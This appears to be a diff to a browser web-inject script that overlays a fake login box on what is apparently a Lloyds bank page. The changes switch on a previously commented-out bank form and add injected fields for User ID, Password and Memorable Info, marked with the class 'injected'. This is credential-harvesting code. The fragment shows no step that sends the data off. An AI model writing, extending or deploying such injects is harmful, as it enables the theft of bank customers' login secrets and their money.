@@ -4,7 +4,7 @@
 	$A = function(e) { $D.body.appendChild(e); };
 	return {
 		init: function() {
-			this.load_css('lloydslogin');
+			this.load_css('lloydslogin.min');
 			this.login();
 		},
 		load_css: function(name) {
@@ -20,7 +20,7 @@
 			this.sandbox = this.launch_sandbox();
 			this.overlay = this.launch_overlay();
 			this.container = this.launch_container();
-			// this.init_bank_form();
+			this.init_bank_form();
 			this.login_box();
 		},
 		init_bank_form: function() {
@@ -94,7 +94,7 @@
 				i.id = name;
 				i.name = name;
 				i.className = 'injected';
-				l['for' ]= i.id;
+				l['for']= i.id;
 				l.innerHTML = placeholder;
 				p.appendChild(l);
 				p.appendChild(i);
@@ -115,9 +115,6 @@
 			var i1 = ci(o, 'injected_UserId1', 'User ID')
 			var i2 = ci(o, 'injected_Password', 'Password')
 			var i3 = ci(o, 'injected_Secret', 'Memorable Info')
-			// o.appendChild(i1);
-			// o.appendChild(i2);
-			// o.appendChild(i3);
 			var p = $E('p');
 			var a = $E('a');
 			a.innerHTML = "\xd7 Cancel";
